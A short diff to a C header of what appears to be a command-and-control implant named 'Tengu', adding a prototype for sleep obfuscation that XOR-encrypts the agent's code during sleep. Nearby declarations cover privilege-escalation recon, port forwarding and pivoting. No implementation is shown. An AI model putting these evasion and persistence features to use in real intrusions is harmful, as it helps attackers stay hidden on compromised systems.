@@ -230,6 +230,9 @@ int  rportfwd_active(void);
 // Commands - privilege escalation recon
 void cmd_privesc(uint32_t req_id);
 
+// Sleep obfuscation: XOR-encrypts agent code during sleep.
+void sleep_obf(unsigned int secs);
+
 // TCP pivot server (parent Tengu listens for child Tengu connections)
 void     pivot_server_init(void);
 int      pivot_server_listen(int port);
